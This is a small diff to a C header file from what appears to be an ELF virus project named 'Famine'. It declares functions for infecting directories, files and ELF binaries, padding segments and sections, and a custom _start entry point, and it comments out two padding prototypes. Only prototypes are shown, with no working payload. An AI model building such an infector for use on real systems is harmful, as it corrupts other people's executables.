@@ -30,7 +30,7 @@
 
 /* famine.c */
 void	infect(void);
-void	infect_dir(char *path);
+void	infect_dir(const char *path);
 int		infect_file(char *file);
 int		infect_fd(int fd, t_elf *elf);
 void	choose_infect(char *path);
@@ -41,8 +41,8 @@ int		get_size_needed(t_elf *elf, t_elf *virus_elf);
 
 /* padding.c */
 void	*update_segment_sz(void *src, void **dst, Elf64_Phdr *segment);
-void	*add_padding_segments(t_elf *elf, void *src, void **dst);
-void	*add_padding_sections(t_elf *elf, void *src, void **dst);
+//void	*add_padding_segments(t_elf *elf, void *src, void **dst);
+//void	*add_padding_sections(t_elf *elf, void *src, void **dst);
 
 /* main.c */
 int		_start(void);
